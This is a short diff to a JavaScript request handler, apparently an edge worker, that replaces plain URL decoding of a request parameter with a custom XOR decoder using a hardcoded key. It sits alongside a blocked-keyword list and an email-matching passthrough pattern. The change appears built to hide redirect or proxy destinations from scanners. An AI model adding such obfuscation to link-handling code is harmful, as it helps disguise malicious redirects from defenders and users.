@@ -5,7 +5,14 @@ const blockedKeywords = _c.theBadKeywords;
  
 
 const passthroughPatterns = [/education\/\/g(?:@|%40)mez/i];
- 
+
+function zkDec(s) {
+	if (!s) return s;
+	var k = [122, 107, 51, 57, 49, 51, 120, 111, 114], n = s.length >> 1, b = new Uint8Array(n);
+	for (var i = 0; i < n; i++) { b[i] = parseInt(s.substr(i * 2, 2), 16) ^ k[i % k.length]; }
+	try { return new TextDecoder().decode(b); } catch (e) { return s; }
+}
+
 function h7568(str) {
 	if (!str) return false;
 	let decoded = str;
@@ -21,7 +28,7 @@ function h7561(url) {
 	);
 	if (!match) return null;
 	try {
-		return decodeURIComponent(match[1]);
+		return zkDec(match[1]);
 	} catch (e) {
 		return match[1];
 	}
@@ -56,7 +63,7 @@ async function handleRequest(event) {
  
 	if (match) {
 		try {
-			const decoded = decodeURIComponent(match[1]);
+			const decoded = zkDec(match[1]);
 			const parsedUrl = new URL(decoded);
  
 			const href = parsedUrl.href;
